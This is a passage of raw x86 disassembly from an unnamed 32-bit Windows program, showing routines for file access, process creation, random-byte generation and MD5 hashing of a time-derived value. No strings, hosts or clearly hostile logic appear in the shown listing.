  40770b:	ff 75 f4             	push   -0xc(%ebp)
  40770e:	8b 35 c4 e0 40 00    	mov    0x40e0c4,%esi
  407714:	ff d6                	call   *%esi
  407716:	ff 75 fc             	push   -0x4(%ebp)
  407719:	ff d6                	call   *%esi
  40771b:	33 c0                	xor    %eax,%eax
  40771d:	eb 03                	jmp    0x407722
  40771f:	33 c0                	xor    %eax,%eax
  407721:	40                   	inc    %eax
  407722:	5f                   	pop    %edi
  407723:	5e                   	pop    %esi
  407724:	5b                   	pop    %ebx
  407725:	c9                   	leave
  407726:	c3                   	ret
  407727:	b8 00 10 00 00       	mov    $0x1000,%eax
  40772c:	e8 7f 5e 00 00       	call   0x40d5b0
  407731:	53                   	push   %ebx
  407732:	56                   	push   %esi
  407733:	57                   	push   %edi
  407734:	bb 00 04 00 00       	mov    $0x400,%ebx
  407739:	53                   	push   %ebx
  40773a:	8d 44 24 10          	lea    0x10(%esp),%eax
  40773e:	50                   	push   %eax
  40773f:	33 ff                	xor    %edi,%edi
  407741:	57                   	push   %edi
  407742:	33 f6                	xor    %esi,%esi
  407744:	ff 15 b0 e0 40 00    	call   *0x40e0b0
  40774a:	39 bc 24 10 10 00 00 	cmp    %edi,0x1010(%esp)
  407751:	74 1a                	je     0x40776d
  407753:	ff b4 24 10 10 00 00 	push   0x1010(%esp)
  40775a:	8d 44 24 10          	lea    0x10(%esp),%eax
  40775e:	50                   	push   %eax
  40775f:	e8 70 fe ff ff       	call   0x4075d4
  407764:	f7 d8                	neg    %eax
  407766:	59                   	pop    %ecx
  407767:	1b c0                	sbb    %eax,%eax
  407769:	59                   	pop    %ecx
  40776a:	40                   	inc    %eax
  40776b:	eb 74                	jmp    0x4077e1
  40776d:	55                   	push   %ebp
  40776e:	8b 2d 64 e0 40 00    	mov    0x40e064,%ebp
  407774:	53                   	push   %ebx
  407775:	8d 84 24 14 08 00 00 	lea    0x814(%esp),%eax
  40777c:	50                   	push   %eax
  40777d:	ff 34 b5 44 10 41 00 	push   0x411044(,%esi,4)
  407784:	ff 15 7c e0 40 00    	call   *0x40e07c
  40778a:	8d 84 24 10 08 00 00 	lea    0x810(%esp),%eax
  407791:	50                   	push   %eax
  407792:	8d 44 24 14          	lea    0x14(%esp),%eax
  407796:	50                   	push   %eax
  407797:	e8 38 fe ff ff       	call   0x4075d4
  40779c:	85 c0                	test   %eax,%eax
  40779e:	59                   	pop    %ecx
  40779f:	59                   	pop    %ecx
  4077a0:	74 49                	je     0x4077eb
  4077a2:	83 f8 01             	cmp    $0x1,%eax
  4077a5:	75 10                	jne    0x4077b7
  4077a7:	6a 04                	push   $0x4
  4077a9:	ff d5                	call   *%ebp
  4077ab:	8d 84 38 40 42 0f 00 	lea    0xf4240(%eax,%edi,1),%eax
  4077b2:	50                   	push   %eax
  4077b3:	6a 04                	push   $0x4
  4077b5:	eb 13                	jmp    0x4077ca
  4077b7:	83 f8 02             	cmp    $0x2,%eax
  4077ba:	75 16                	jne    0x4077d2
  4077bc:	6a 04                	push   $0x4
  4077be:	ff d5                	call   *%ebp
  4077c0:	8d 84 38 40 42 0f 00 	lea    0xf4240(%eax,%edi,1),%eax
  4077c7:	50                   	push   %eax
  4077c8:	6a 05                	push   $0x5
  4077ca:	e8 b7 2f 00 00       	call   0x40a786
  4077cf:	83 c4 0c             	add    $0xc,%esp
  4077d2:	46                   	inc    %esi
  4077d3:	81 c7 40 42 0f 00    	add    $0xf4240,%edi
  4077d9:	83 fe 02             	cmp    $0x2,%esi
  4077dc:	7c 96                	jl     0x407774
  4077de:	33 c0                	xor    %eax,%eax
  4077e0:	5d                   	pop    %ebp
  4077e1:	5f                   	pop    %edi
  4077e2:	5e                   	pop    %esi
  4077e3:	5b                   	pop    %ebx
  4077e4:	81 c4 00 10 00 00    	add    $0x1000,%esp
  4077ea:	c3                   	ret
  4077eb:	8d 46 01             	lea    0x1(%esi),%eax
  4077ee:	eb f0                	jmp    0x4077e0
  4077f0:	55                   	push   %ebp
  4077f1:	8b ec                	mov    %esp,%ebp
  4077f3:	83 ec 54             	sub    $0x54,%esp
  4077f6:	56                   	push   %esi
  4077f7:	6a 44                	push   $0x44
  4077f9:	33 f6                	xor    %esi,%esi
  4077fb:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4077fe:	56                   	push   %esi
  4077ff:	50                   	push   %eax
  407800:	e8 2b 5d 00 00       	call   0x40d530
  407805:	83 c4 0c             	add    $0xc,%esp
  407808:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40780b:	50                   	push   %eax
  40780c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40780f:	50                   	push   %eax
  407810:	56                   	push   %esi
  407811:	56                   	push   %esi
  407812:	6a 20                	push   $0x20
  407814:	56                   	push   %esi
  407815:	56                   	push   %esi
  407816:	56                   	push   %esi
  407817:	ff 75 08             	push   0x8(%ebp)
  40781a:	56                   	push   %esi
  40781b:	ff 15 58 e0 40 00    	call   *0x40e058
  407821:	f7 d8                	neg    %eax
  407823:	1b c0                	sbb    %eax,%eax
  407825:	f7 d8                	neg    %eax
  407827:	5e                   	pop    %esi
  407828:	c9                   	leave
  407829:	c3                   	ret
  40782a:	55                   	push   %ebp
  40782b:	8b ec                	mov    %esp,%ebp
  40782d:	83 e4 f8             	and    $0xfffffff8,%esp
  407830:	81 ec 08 08 00 00    	sub    $0x808,%esp
  407836:	56                   	push   %esi
  407837:	57                   	push   %edi
  407838:	68 00 04 00 00       	push   $0x400
  40783d:	8d 44 24 14          	lea    0x14(%esp),%eax
  407841:	33 f6                	xor    %esi,%esi
  407843:	50                   	push   %eax
  407844:	56                   	push   %esi
  407845:	89 74 24 14          	mov    %esi,0x14(%esp)
  407849:	89 74 24 18          	mov    %esi,0x18(%esp)
  40784d:	ff 15 b0 e0 40 00    	call   *0x40e0b0
  407853:	56                   	push   %esi
  407854:	56                   	push   %esi
  407855:	6a 03                	push   $0x3
  407857:	56                   	push   %esi
  407858:	6a 03                	push   $0x3
  40785a:	68 00 00 00 80       	push   $0x80000000
  40785f:	8d 44 24 28          	lea    0x28(%esp),%eax
  407863:	50                   	push   %eax
  407864:	ff 15 c0 e0 40 00    	call   *0x40e0c0
  40786a:	8b f8                	mov    %eax,%edi
  40786c:	83 ff ff             	cmp    $0xffffffff,%edi
  40786f:	74 17                	je     0x407888
  407871:	56                   	push   %esi
  407872:	56                   	push   %esi
  407873:	8d 44 24 10          	lea    0x10(%esp),%eax
  407877:	50                   	push   %eax
  407878:	57                   	push   %edi
  407879:	ff 15 b4 e0 40 00    	call   *0x40e0b4
  40787f:	57                   	push   %edi
  407880:	ff 15 c4 e0 40 00    	call   *0x40e0c4
  407886:	eb 28                	jmp    0x4078b0
  407888:	ff 15 50 e0 40 00    	call   *0x40e050
  40788e:	a3 e0 14 41 00       	mov    %eax,0x4114e0
  407893:	e8 b5 df ff ff       	call   0x40584d
  407898:	25 ff 00 00 80       	and    $0x800000ff,%eax
  40789d:	79 07                	jns    0x4078a6
  40789f:	48                   	dec    %eax
  4078a0:	0d 00 ff ff ff       	or     $0xffffff00,%eax
  4078a5:	40                   	inc    %eax
  4078a6:	88 44 34 08          	mov    %al,0x8(%esp,%esi,1)
  4078aa:	46                   	inc    %esi
  4078ab:	83 fe 08             	cmp    $0x8,%esi
  4078ae:	72 e3                	jb     0x407893
  4078b0:	ff 74 24 0c          	push   0xc(%esp)
  4078b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4078b7:	ff 74 24 0c          	push   0xc(%esp)
  4078bb:	e8 f5 de ff ff       	call   0x4057b5
  4078c0:	59                   	pop    %ecx
  4078c1:	59                   	pop    %ecx
  4078c2:	33 c0                	xor    %eax,%eax
  4078c4:	5f                   	pop    %edi
  4078c5:	40                   	inc    %eax
  4078c6:	5e                   	pop    %esi
  4078c7:	8b e5                	mov    %ebp,%esp
  4078c9:	5d                   	pop    %ebp
  4078ca:	c3                   	ret
  4078cb:	56                   	push   %esi
  4078cc:	ff 74 24 08          	push   0x8(%esp)
  4078d0:	be b8 e9 40 00       	mov    $0x40e9b8,%esi
  4078d5:	56                   	push   %esi
  4078d6:	33 c0                	xor    %eax,%eax
  4078d8:	e8 4e 05 00 00       	call   0x407e2b
  4078dd:	85 c0                	test   %eax,%eax
  4078df:	59                   	pop    %ecx
  4078e0:	59                   	pop    %ecx
  4078e1:	75 20                	jne    0x407903
  4078e3:	ff 74 24 08          	push   0x8(%esp)
  4078e7:	e8 3e ff ff ff       	call   0x40782a
  4078ec:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  4078f1:	59                   	pop    %ecx
  4078f2:	74 0f                	je     0x407903
  4078f4:	ff 74 24 08          	push   0x8(%esp)
  4078f8:	56                   	push   %esi
  4078f9:	6a 00                	push   $0x0
  4078fb:	e8 61 04 00 00       	call   0x407d61
  407900:	83 c4 0c             	add    $0xc,%esp
  407903:	33 c0                	xor    %eax,%eax
  407905:	40                   	inc    %eax
  407906:	5e                   	pop    %esi
  407907:	c3                   	ret
  407908:	ff 74 24 04          	push   0x4(%esp)
  40790c:	83 c0 02             	add    $0x2,%eax
  40790f:	68 90 e9 40 00       	push   $0x40e990
  407914:	e8 12 05 00 00       	call   0x407e2b
  407919:	59                   	pop    %ecx
  40791a:	59                   	pop    %ecx
  40791b:	c3                   	ret
  40791c:	51                   	push   %ecx
  40791d:	56                   	push   %esi
  40791e:	ff 74 24 0c          	push   0xc(%esp)
  407922:	83 c0 02             	add    $0x2,%eax
  407925:	68 90 e9 40 00       	push   $0x40e990
  40792a:	50                   	push   %eax
  40792b:	e8 31 04 00 00       	call   0x407d61
  407930:	8b f0                	mov    %eax,%esi
  407932:	83 c4 0c             	add    $0xc,%esp
  407935:	85 f6                	test   %esi,%esi
  407937:	75 13                	jne    0x40794c
  407939:	6a 04                	push   $0x4
  40793b:	ff 15 64 e0 40 00    	call   *0x40e064
  407941:	50                   	push   %eax
  407942:	6a 0d                	push   $0xd
  407944:	e8 3d 2e 00 00       	call   0x40a786
  407949:	83 c4 0c             	add    $0xc,%esp
  40794c:	8b c6                	mov    %esi,%eax
  40794e:	5e                   	pop    %esi
  40794f:	59                   	pop    %ecx
  407950:	c3                   	ret
  407951:	55                   	push   %ebp
  407952:	8b ec                	mov    %esp,%ebp
  407954:	81 ec 00 02 00 00    	sub    $0x200,%esp
  40795a:	56                   	push   %esi
  40795b:	57                   	push   %edi
  40795c:	8b f8                	mov    %eax,%edi
  40795e:	be 90 e9 40 00       	mov    $0x40e990,%esi
  407963:	eb 13                	jmp    0x407978
  407965:	83 ff 05             	cmp    $0x5,%edi
  407968:	7d 24                	jge    0x40798e
  40796a:	68 64 e2 40 00       	push   $0x40e264
  40796f:	8b c7                	mov    %edi,%eax
  407971:	e8 a6 ff ff ff       	call   0x40791c
  407976:	59                   	pop    %ecx
  407977:	47                   	inc    %edi
  407978:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
  40797e:	50                   	push   %eax
  40797f:	56                   	push   %esi
  407980:	8d 47 02             	lea    0x2(%edi),%eax
  407983:	e8 a3 04 00 00       	call   0x407e2b
  407988:	85 c0                	test   %eax,%eax
  40798a:	59                   	pop    %ecx
  40798b:	59                   	pop    %ecx
  40798c:	75 d7                	jne    0x407965
  40798e:	33 c0                	xor    %eax,%eax
  407990:	5f                   	pop    %edi
  407991:	40                   	inc    %eax
  407992:	5e                   	pop    %esi
  407993:	c9                   	leave
  407994:	c3                   	ret
  407995:	55                   	push   %ebp
  407996:	8b ec                	mov    %esp,%ebp
  407998:	b8 04 10 00 00       	mov    $0x1004,%eax
  40799d:	e8 0e 5c 00 00       	call   0x40d5b0
  4079a2:	85 ff                	test   %edi,%edi
  4079a4:	56                   	push   %esi
  4079a5:	74 4e                	je     0x4079f5
  4079a7:	85 db                	test   %ebx,%ebx
  4079a9:	74 4a                	je     0x4079f5
  4079ab:	33 f6                	xor    %esi,%esi
  4079ad:	85 db                	test   %ebx,%ebx
  4079af:	7e 40                	jle    0x4079f1
  4079b1:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  4079b7:	50                   	push   %eax
  4079b8:	68 90 e9 40 00       	push   $0x40e990
  4079bd:	8d 46 02             	lea    0x2(%esi),%eax
  4079c0:	e8 66 04 00 00       	call   0x407e2b
  4079c5:	85 c0                	test   %eax,%eax
  4079c7:	59                   	pop    %ecx
  4079c8:	59                   	pop    %ecx
  4079c9:	74 16                	je     0x4079e1
  4079cb:	8b 14 b7             	mov    (%edi,%esi,4),%edx
  4079ce:	85 d2                	test   %edx,%edx
  4079d0:	74 0f                	je     0x4079e1
  4079d2:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  4079d8:	e8 8a da ff ff       	call   0x405467
  4079dd:	85 c0                	test   %eax,%eax
  4079df:	74 0b                	je     0x4079ec
  4079e1:	ff 34 b7             	push   (%edi,%esi,4)
  4079e4:	8b c6                	mov    %esi,%eax
  4079e6:	e8 31 ff ff ff       	call   0x40791c
  4079eb:	59                   	pop    %ecx
  4079ec:	46                   	inc    %esi
  4079ed:	3b f3                	cmp    %ebx,%esi
  4079ef:	7c c0                	jl     0x4079b1
  4079f1:	8b c3                	mov    %ebx,%eax
  4079f3:	eb 02                	jmp    0x4079f7
  4079f5:	33 c0                	xor    %eax,%eax
  4079f7:	e8 55 ff ff ff       	call   0x407951
  4079fc:	5e                   	pop    %esi
  4079fd:	c9                   	leave
  4079fe:	c3                   	ret
  4079ff:	56                   	push   %esi
  407a00:	e8 03 ff ff ff       	call   0x407908
  407a05:	85 c0                	test   %eax,%eax
  407a07:	59                   	pop    %ecx
  407a08:	75 03                	jne    0x407a0d
  407a0a:	33 c0                	xor    %eax,%eax
  407a0c:	c3                   	ret
  407a0d:	56                   	push   %esi
  407a0e:	e8 3e da ff ff       	call   0x405451
  407a13:	85 c0                	test   %eax,%eax
  407a15:	59                   	pop    %ecx
  407a16:	74 f2                	je     0x407a0a
  407a18:	b8 64 e2 40 00       	mov    $0x40e264,%eax
  407a1d:	8b d6                	mov    %esi,%edx
  407a1f:	e8 43 da ff ff       	call   0x405467
  407a24:	85 c0                	test   %eax,%eax
  407a26:	74 e2                	je     0x407a0a
  407a28:	68 cc eb 40 00       	push   $0x40ebcc
  407a2d:	8b c6                	mov    %esi,%eax
  407a2f:	e8 5f da ff ff       	call   0x405493
  407a34:	f7 d8                	neg    %eax
  407a36:	1b c0                	sbb    %eax,%eax
  407a38:	59                   	pop    %ecx
  407a39:	f7 d8                	neg    %eax
  407a3b:	c3                   	ret
  407a3c:	55                   	push   %ebp
  407a3d:	8b ec                	mov    %esp,%ebp
  407a3f:	83 e4 f8             	and    $0xfffffff8,%esp
  407a42:	81 ec 3c 08 00 00    	sub    $0x83c,%esp
  407a48:	56                   	push   %esi
  407a49:	52                   	push   %edx
  407a4a:	e8 02 da ff ff       	call   0x405451
  407a4f:	83 f8 13             	cmp    $0x13,%eax
  407a52:	59                   	pop    %ecx
  407a53:	0f 82 ee 00 00 00    	jb     0x407b47
  407a59:	0f b7 02             	movzwl (%edx),%eax
  407a5c:	66 3d 30 00          	cmp    $0x30,%ax
  407a60:	0f 82 e1 00 00 00    	jb     0x407b47
  407a66:	66 3d 39 00          	cmp    $0x39,%ax
  407a6a:	0f 87 d7 00 00 00    	ja     0x407b47
  407a70:	6a 26                	push   $0x26
  407a72:	52                   	push   %edx
  407a73:	8d 44 24 48          	lea    0x48(%esp),%eax
  407a77:	50                   	push   %eax
  407a78:	e8 53 4b 00 00       	call   0x40c5d0
  407a7d:	33 f6                	xor    %esi,%esi
  407a7f:	83 c4 0c             	add    $0xc,%esp
  407a82:	66 89 74 24 66       	mov    %si,0x66(%esp)
  407a87:	33 d2                	xor    %edx,%edx
  407a89:	8d 44 54 40          	lea    0x40(%esp,%edx,2),%eax
  407a8d:	0f b7 08             	movzwl (%eax),%ecx
  407a90:	66 83 f9 30          	cmp    $0x30,%cx
  407a94:	72 06                	jb     0x407a9c
  407a96:	66 83 f9 39          	cmp    $0x39,%cx
  407a9a:	76 05                	jbe    0x407aa1
  407a9c:	66 c7 00 5e 00       	movw   $0x5e,(%eax)
  407aa1:	42                   	inc    %edx
  407aa2:	83 fa 13             	cmp    $0x13,%edx
  407aa5:	7c e2                	jl     0x407a89
  407aa7:	8d 44 24 14          	lea    0x14(%esp),%eax
  407aab:	50                   	push   %eax
  407aac:	56                   	push   %esi
  407aad:	6a 5e                	push   $0x5e
  407aaf:	8d 44 24 24          	lea    0x24(%esp),%eax
  407ab3:	50                   	push   %eax
  407ab4:	8d 44 24 50          	lea    0x50(%esp),%eax
  407ab8:	50                   	push   %eax
  407ab9:	e8 3d de ff ff       	call   0x4058fb
  407abe:	83 c4 14             	add    $0x14,%esp
  407ac1:	83 7c 24 14 06       	cmpl   $0x6,0x14(%esp)
  407ac6:	75 7f                	jne    0x407b47
  407ac8:	66 8b 44 24 20       	mov    0x20(%esp),%ax
  407acd:	66 89 44 24 04       	mov    %ax,0x4(%esp)
  407ad2:	66 8b 44 24 1c       	mov    0x1c(%esp),%ax
  407ad7:	66 89 44 24 06       	mov    %ax,0x6(%esp)
  407adc:	66 8b 44 24 18       	mov    0x18(%esp),%ax
  407ae1:	66 89 44 24 0a       	mov    %ax,0xa(%esp)
  407ae6:	66 8b 44 24 24       	mov    0x24(%esp),%ax
  407aeb:	66 89 44 24 0c       	mov    %ax,0xc(%esp)
  407af0:	66 8b 44 24 28       	mov    0x28(%esp),%ax
  407af5:	66 89 44 24 0e       	mov    %ax,0xe(%esp)
  407afa:	66 8b 44 24 2c       	mov    0x2c(%esp),%ax
  407aff:	66 89 44 24 10       	mov    %ax,0x10(%esp)
  407b04:	8d 44 24 04          	lea    0x4(%esp),%eax
  407b08:	66 89 74 24 12       	mov    %si,0x12(%esp)
  407b0d:	66 89 74 24 08       	mov    %si,0x8(%esp)
  407b12:	e8 50 f7 ff ff       	call   0x407267
  407b17:	8b f0                	mov    %eax,%esi
  407b19:	33 c0                	xor    %eax,%eax
  407b1b:	e8 47 f7 ff ff       	call   0x407267
  407b20:	2b f0                	sub    %eax,%esi
  407b22:	8d 44 24 40          	lea    0x40(%esp),%eax
  407b26:	89 35 cc a4 41 00    	mov    %esi,0x41a4cc
  407b2c:	e8 18 dc ff ff       	call   0x405749
  407b31:	8d 44 24 40          	lea    0x40(%esp),%eax
  407b35:	50                   	push   %eax
  407b36:	68 a4 e9 40 00       	push   $0x40e9a4
  407b3b:	6a 01                	push   $0x1
  407b3d:	e8 1f 02 00 00       	call   0x407d61
  407b42:	83 c4 0c             	add    $0xc,%esp
  407b45:	eb 02                	jmp    0x407b49
  407b47:	33 c0                	xor    %eax,%eax
  407b49:	5e                   	pop    %esi
  407b4a:	8b e5                	mov    %ebp,%esp
  407b4c:	5d                   	pop    %ebp
  407b4d:	c3                   	ret
  407b4e:	55                   	push   %ebp
  407b4f:	8b ec                	mov    %esp,%ebp
  407b51:	83 e4 f8             	and    $0xfffffff8,%esp
  407b54:	81 ec 20 01 00 00    	sub    $0x120,%esp
  407b5a:	56                   	push   %esi
  407b5b:	57                   	push   %edi
  407b5c:	33 c0                	xor    %eax,%eax
  407b5e:	e8 04 f7 ff ff       	call   0x407267
  407b63:	8b f8                	mov    %eax,%edi
  407b65:	a1 cc a4 41 00       	mov    0x41a4cc,%eax
  407b6a:	85 c0                	test   %eax,%eax
  407b6c:	75 2c                	jne    0x407b9a
  407b6e:	8d 84 24 d8 00 00 00 	lea    0xd8(%esp),%eax
  407b75:	50                   	push   %eax
  407b76:	33 c0                	xor    %eax,%eax
  407b78:	68 a4 e9 40 00       	push   $0x40e9a4
  407b7d:	40                   	inc    %eax
  407b7e:	e8 a8 02 00 00       	call   0x407e2b
  407b83:	85 c0                	test   %eax,%eax
  407b85:	59                   	pop    %ecx
  407b86:	59                   	pop    %ecx
  407b87:	74 11                	je     0x407b9a
  407b89:	8d 84 24 d8 00 00 00 	lea    0xd8(%esp),%eax
  407b90:	e8 8f da ff ff       	call   0x405624
  407b95:	a3 cc a4 41 00       	mov    %eax,0x41a4cc
  407b9a:	03 c7                	add    %edi,%eax
  407b9c:	33 d2                	xor    %edx,%edx
  407b9e:	b9 b0 04 00 00       	mov    $0x4b0,%ecx
  407ba3:	f7 f1                	div    %ecx
  407ba5:	8d 74 24 70          	lea    0x70(%esp),%esi
  407ba9:	8b f8                	mov    %eax,%edi
  407bab:	85 ff                	test   %edi,%edi
  407bad:	75 0b                	jne    0x407bba
  407baf:	c6 44 24 70 30       	movb   $0x30,0x70(%esp)
  407bb4:	88 44 24 71          	mov    %al,0x71(%esp)
  407bb8:	eb 3e                	jmp    0x407bf8
  407bba:	b9 00 ca 9a 3b       	mov    $0x3b9aca00,%ecx
  407bbf:	3b f9                	cmp    %ecx,%edi
  407bc1:	73 11                	jae    0x407bd4
  407bc3:	8b c1                	mov    %ecx,%eax
  407bc5:	6a 0a                	push   $0xa
  407bc7:	33 d2                	xor    %edx,%edx
  407bc9:	59                   	pop    %ecx
  407bca:	f7 f1                	div    %ecx
  407bcc:	8b c8                	mov    %eax,%ecx
  407bce:	3b f9                	cmp    %ecx,%edi
  407bd0:	72 f1                	jb     0x407bc3
  407bd2:	eb 1e                	jmp    0x407bf2
  407bd4:	33 d2                	xor    %edx,%edx
  407bd6:	8b c7                	mov    %edi,%eax
  407bd8:	f7 f1                	div    %ecx
  407bda:	6a 0a                	push   $0xa
  407bdc:	8a d0                	mov    %al,%dl
  407bde:	0f af c1             	imul   %ecx,%eax
  407be1:	80 c2 30             	add    $0x30,%dl
  407be4:	2b f8                	sub    %eax,%edi
  407be6:	88 16                	mov    %dl,(%esi)
  407be8:	8b c1                	mov    %ecx,%eax
  407bea:	33 d2                	xor    %edx,%edx
  407bec:	59                   	pop    %ecx
  407bed:	f7 f1                	div    %ecx
  407bef:	46                   	inc    %esi
  407bf0:	8b c8                	mov    %eax,%ecx
  407bf2:	85 c9                	test   %ecx,%ecx
  407bf4:	75 de                	jne    0x407bd4
  407bf6:	88 0e                	mov    %cl,(%esi)
  407bf8:	80 7c 24 70 00       	cmpb   $0x0,0x70(%esp)
  407bfd:	ba d8 eb 40 00       	mov    $0x40ebd8,%edx
  407c02:	8d 44 24 70          	lea    0x70(%esp),%eax
  407c06:	74 06                	je     0x407c0e
  407c08:	40                   	inc    %eax
  407c09:	80 38 00             	cmpb   $0x0,(%eax)
  407c0c:	75 fa                	jne    0x407c08
  407c0e:	8a 0a                	mov    (%edx),%cl
  407c10:	88 08                	mov    %cl,(%eax)
  407c12:	40                   	inc    %eax
  407c13:	42                   	inc    %edx
  407c14:	84 c9                	test   %cl,%cl
  407c16:	75 f6                	jne    0x407c0e
  407c18:	33 ff                	xor    %edi,%edi
  407c1a:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  407c1e:	89 7c 24 18          	mov    %edi,0x18(%esp)
  407c22:	c7 44 24 20 01 23 45 	movl   $0x67452301,0x20(%esp)
  407c29:	67 
  407c2a:	c7 44 24 24 89 ab cd 	movl   $0xefcdab89,0x24(%esp)
  407c31:	ef 
  407c32:	c7 44 24 28 fe dc ba 	movl   $0x98badcfe,0x28(%esp)
  407c39:	98 
  407c3a:	c7 44 24 2c 76 54 32 	movl   $0x10325476,0x2c(%esp)
  407c41:	10 
  407c42:	8d 44 24 70          	lea    0x70(%esp),%eax
  407c46:	8a 08                	mov    (%eax),%cl
  407c48:	40                   	inc    %eax
  407c49:	84 c9                	test   %cl,%cl
  407c4b:	75 f9                	jne    0x407c46
  407c4d:	8d 4c 24 70          	lea    0x70(%esp),%ecx
  407c51:	2b c1                	sub    %ecx,%eax
  407c53:	48                   	dec    %eax
  407c54:	8b d0                	mov    %eax,%edx
  407c56:	3b d7                	cmp    %edi,%edx
  407c58:	7e 14                	jle    0x407c6e
  407c5a:	52                   	push   %edx
  407c5b:	51                   	push   %ecx
  407c5c:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  407c60:	51                   	push   %ecx
  407c61:	c1 e0 03             	shl    $0x3,%eax
  407c64:	33 c9                	xor    %ecx,%ecx
  407c66:	e8 49 40 00 00       	call   0x40bcb4
  407c6b:	83 c4 0c             	add    $0xc,%esp
  407c6e:	8d 44 24 08          	lea    0x8(%esp),%eax
  407c72:	50                   	push   %eax
  407c73:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  407c77:	e8 d9 40 00 00       	call   0x40bd55
  407c7c:	59                   	pop    %ecx
  407c7d:	33 c9                	xor    %ecx,%ecx
  407c7f:	8a 54 0c 08          	mov    0x8(%esp,%ecx,1),%dl
  407c83:	8a c2                	mov    %dl,%al
  407c85:	c0 e8 04             	shr    $0x4,%al
  407c88:	3c 0a                	cmp    $0xa,%al
  407c8a:	66 0f b6 c0          	movzbw %al,%ax
  407c8e:	73 06                	jae    0x407c96
  407c90:	66 05 30 00          	add    $0x30,%ax
  407c94:	eb 04                	jmp    0x407c9a
  407c96:	66 05 57 00          	add    $0x57,%ax
  407c9a:	66 89 04 8b          	mov    %ax,(%ebx,%ecx,4)
  407c9e:	0f b6 c2             	movzbl %dl,%eax
  407ca1:	25 0f 00 00 80       	and    $0x8000000f,%eax
  407ca6:	79 05                	jns    0x407cad
  407ca8:	48                   	dec    %eax
  407ca9:	83 c8 f0             	or     $0xfffffff0,%eax
  407cac:	40                   	inc    %eax
  407cad:	3c 0a                	cmp    $0xa,%al
  407caf:	66 0f b6 c0          	movzbw %al,%ax
  407cb3:	73 06                	jae    0x407cbb
  407cb5:	66 05 30 00          	add    $0x30,%ax
  407cb9:	eb 04                	jmp    0x407cbf
  407cbb:	66 05 57 00          	add    $0x57,%ax
  407cbf:	66 89 44 8b 02       	mov    %ax,0x2(%ebx,%ecx,4)
  407cc4:	41                   	inc    %ecx
  407cc5:	83 f9 10             	cmp    $0x10,%ecx
  407cc8:	7c b5                	jl     0x407c7f
  407cca:	66 89 7b 40          	mov    %di,0x40(%ebx)
  407cce:	33 c0                	xor    %eax,%eax
  407cd0:	5f                   	pop    %edi
  407cd1:	40                   	inc    %eax
  407cd2:	5e                   	pop    %esi
  407cd3:	8b e5                	mov    %ebp,%esp
  407cd5:	5d                   	pop    %ebp
  407cd6:	c3                   	ret
  407cd7:	55                   	push   %ebp
  407cd8:	8b ec                	mov    %esp,%ebp
  407cda:	b8 00 20 00 00       	mov    $0x2000,%eax
  407cdf:	e8 cc 58 00 00       	call   0x40d5b0
  407ce4:	56                   	push   %esi
  407ce5:	57                   	push   %edi
  407ce6:	be 00 10 00 00       	mov    $0x1000,%esi
  407ceb:	56                   	push   %esi
  407cec:	8d 85 00 e0 ff ff    	lea    -0x2000(%ebp),%eax
  407cf2:	50                   	push   %eax
  407cf3:	33 ff                	xor    %edi,%edi
  407cf5:	57                   	push   %edi
  407cf6:	ff 15 b0 e0 40 00    	call   *0x40e0b0
  407cfc:	85 c0                	test   %eax,%eax
  407cfe:	74 0d                	je     0x407d0d
  407d00:	8d 95 00 e0 ff ff    	lea    -0x2000(%ebp),%edx
  407d06:	e8 ee ef ff ff       	call   0x406cf9
  407d0b:	eb 0e                	jmp    0x407d1b
  407d0d:	8d 85 00 e0 ff ff    	lea    -0x2000(%ebp),%eax
  407d13:	50                   	push   %eax
  407d14:	56                   	push   %esi
  407d15:	ff 15 d4 e0 40 00    	call   *0x40e0d4
  407d1b:	b9 bc f2 40 00       	mov    $0x40f2bc,%ecx
  407d20:	8d 85 00 e0 ff ff    	lea    -0x2000(%ebp),%eax
  407d26:	e8 c2 d7 ff ff       	call   0x4054ed
  407d2b:	39 7d 08             	cmp    %edi,0x8(%ebp)
  407d2e:	6a 04                	push   $0x4
  407d30:	58                   	pop    %eax
  407d31:	74 03                	je     0x407d36
  407d33:	6a 03                	push   $0x3
  407d35:	58                   	pop    %eax
  407d36:	57                   	push   %edi
  407d37:	6a 02                	push   $0x2
  407d39:	50                   	push   %eax
  407d3a:	57                   	push   %edi
  407d3b:	57                   	push   %edi
  407d3c:	68 00 00 00 c0       	push   $0xc0000000
  407d41:	8d 85 00 e0 ff ff    	lea    -0x2000(%ebp),%eax
  407d47:	50                   	push   %eax
  407d48:	ff 15 c0 e0 40 00    	call   *0x40e0c0
  407d4e:	33 c9                	xor    %ecx,%ecx
  407d50:	83 f8 ff             	cmp    $0xffffffff,%eax
  407d53:	0f 95 c1             	setne  %cl
  407d56:	5f                   	pop    %edi
  407d57:	a3 b4 10 41 00       	mov    %eax,0x4110b4
  407d5c:	5e                   	pop    %esi
  407d5d:	8b c1                	mov    %ecx,%eax
  407d5f:	c9                   	leave
  407d60:	c3                   	ret
  407d61:	55                   	push   %ebp
  407d62:	8b ec                	mov    %esp,%ebp
  407d64:	83 ec 68             	sub    $0x68,%esp
  407d67:	83 3d b4 10 41 00 ff 	cmpl   $0xffffffff,0x4110b4
  407d6e:	75 15                	jne    0x407d85
  407d70:	6a 00                	push   $0x0
  407d72:	e8 60 ff ff ff       	call   0x407cd7
  407d77:	83 3d b4 10 41 00 ff 	cmpl   $0xffffffff,0x4110b4
  407d7e:	59                   	pop    %ecx
  407d7f:	75 04                	jne    0x407d85
  407d81:	33 c0                	xor    %eax,%eax
  407d83:	c9                   	leave
  407d84:	c3                   	ret
  407d85:	53                   	push   %ebx
  407d86:	56                   	push   %esi
  407d87:	57                   	push   %edi
  407d88:	ff 75 0c             	push   0xc(%ebp)
  407d8b:	e8 c1 d6 ff ff       	call   0x405451
  407d90:	ff 75 10             	push   0x10(%ebp)
  407d93:	8b f0                	mov    %eax,%esi
  407d95:	e8 b7 d6 ff ff       	call   0x405451
  407d9a:	8b 55 0c             	mov    0xc(%ebp),%edx
  407d9d:	8b d8                	mov    %eax,%ebx
  407d9f:	8d 45 98             	lea    -0x68(%ebp),%eax
